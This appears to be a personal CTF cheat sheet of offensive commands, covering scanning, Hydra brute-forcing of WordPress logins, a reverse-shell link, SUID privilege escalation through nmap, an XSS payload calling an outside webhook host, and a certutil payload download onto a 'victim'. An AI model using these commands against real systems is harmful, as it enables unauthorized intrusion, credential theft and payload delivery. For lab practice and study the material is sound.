---
header:
  
layout: single
classes: wide

---

# System Hacking

* To discover the system in the network, use either Nmap or Netdiscover
* To scan for vulnerabilities use nikto.
  * Command to run : `nikto -h <HOST_IP>`
* To scan for vulnerbilities we can use Nmap also.
  * `namp -sV <HOST_IP>`
  * `nmap --script vuln <HOST_IP>`  -- Useful for getting Vulnerabilities on system
  * `nmap -sS -T4 -A -p- <HOST_IP>` -- Useful for All Ports, SYN Scan and OS detection
  * `nmap --script ssl-enum-ciphers -p 443  <HOST_IP>` -- Gives rating for SSL Ciphers
* If port 80 is open, use robots.txt to find any hidden flags.
* If Webserver is running, we can find the Server version using
  * `curl --header <SERVER_IP>`
* If we want to find exploit of a particular version, use the command
  * `searchsploit apache 1.2.4`
* If /wp-login.php is found in the Vulnerability scanning, it can be Wordpress site.
* Use Burpsuite to see login data
* Use Hydra to bruteforce username
  * `hydra -V -l wordlist.dic -p 123 <HOST_IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username`
* Use wpscan tool to scan Wordpress Website
  * `gem install wpscan`
  * `wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic`
* We can use metasploit to exploit the server
  * use exploit/unix/webapp/wp_admin_shell_upload -- Does not work
  * pentestmonkey.net/tools/web-shells/php-reverse-shell
* Command to get Bash shell
  * `python -c "import pty;pty.spawn('/bin/bash')"`
* Privilige Escalation: Now if we found the hash for the priviliged user, we can use crackstation.net/ to get the password.
* To find all the files which current user can interact use the command
  * `find / -perm -4000 2>/dev/null`
* If there is any program which we can get to use as root, we need to target that.
  ```
  robot@linux:/$ nmap --interactive
  nmap --interactive
  Starting nmap V. 3.81 ( www.insecure.org/nmap/ )
  Welcome to Interactive Mode -- press h <enter> for help
  nmap> !sh
  !sh
  # id
  id
  uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
  ```
* If we got access to VIM (MAN Pages), we can run `!<Command>` to execute directly in the shell.
* If we want to run old 16bit or 32bit windows program, we can use www.dosbox.com, an emulator which can be installed on Windows.
* If RPC is open, we can use the following to login
  * `rpcclient -U "" <HOST_IP>` -- If this is success without password, we can login using null session.
* If SMB is open, we can use the following command to try connecting
  * `smbclient -L \\\\<HOST_IP>`

# File Hacking
* If something is hidden on a pdf which we need to find, we can Press Ctrl + A to copy everything on the pdf and paste on notepad.
   * If nothing is found, we can use [Inkspace tool](https://inkscape.org) to paste the pdf and try to ungroup several times to extract any hidden flag.
   * We can even solve using pdf-uncompress tools like qpdf to convert compressed data to redeable format and solve from there.
* If there is `PK` at the start of the file in the magic bytes, its most probably `ZIP` File.
* If there is recursive ZIP File, we can use the following command `binwalk -Me <FILE_NAME>`.
* If EXE file is having some hidden text, we can use hexeditor or strings to locate the flag.
* If hidden text has == at the end, it is base64 encoded.
* We can use Strace to track all application calls.
  * Command: `strace -s -f 12345 -e trace=recv,read <PROGRAM>`
* We can use ltrace to track all app + library calls.
  * Command: `ltrace ./<PROG_NAME>`

# Crypto
* If there is word `caesar` in the question or hint, this can be a substitution cipher.
  * Use this website www.dcode.fr/caesar-cipher to Bruteforce the hidden message.

# Forensics
* If there is a image given, try `file` comamnd on the image to learn more information.
* Binwalk to find data inside the image or sometimes if binwalk reports as zip Archive, we can rename the file to <FILE_NAME>.zip to find interesting data.
   * Command `binwalk <IMAGE_NAME>`
* If there is ntfs file,extract with 7Zip on Windowds. If there is a file with alternative data strems, we can use the command `dir /R <FILE_NAME>` and then we can this command to extract data inside it `cat <HIDDEN_STREAM> > asdf.<FILE_TYPE>`
* Method to extract ntfs in Linux : `sudo mount -o loop <FILENAME.ntfs> mnt`

# Password Cracking
* If there is `JOHN` in the title/text/hint, its mostly reference to `JOHN the ripper` for bruteforce passwords/hashes.
  * Command : `./john -show <PASS_FILE>`
  
# XSS Attack
* If there is a website, with a text field to submit, we can try XSS Attack.
  * Use any online HTTP Bin website like https://webhook.site/#!/
  * ``` ""> <img src="https://webhook.site/19df1f1a-2ec8-453e-b85b-ed2cab66a5cc>"```
  
# Packet Capture
* If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
  * Example Command : `tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields`

# Tools
* Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
* CTF Exploitation Framework : Github.com/Gallopsled/pwntools `pip install pwntools`
* When using GDB, we can create "~/.gdbinit" file and add this line "set disassembly-flavor intel" to make intel synatx.
* Dirbuster for enumeration web server Attacks.

## Recover Files from Deleted File Systems
* To Extract Flag from the file system - `strings /dev/sdb`
* Flag Recovery with regex `grep -a '[a-z0-9]\{32\}' /dev/sdb`
* `ssh username@remote_address "sudo dcfldd -if=/dev/sdb | gzip -1 ." | dcfldd of=extract.dd.gz` -- Used to get from Remote Hosts
* `gunzip -d extract.dd.gz`
* `binwalk -Me extract.dd`

## Transfer Files from Host to Target Machine
* Use `python -m SimpleHTTPServer` in the host folder.
* Use Apache and put files in `/var/www/html/` folder.
* If Tomcat is Opened, upload the file/payload using the Admin panel.
* If wordpress is running, upload the file as plugin.
* In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
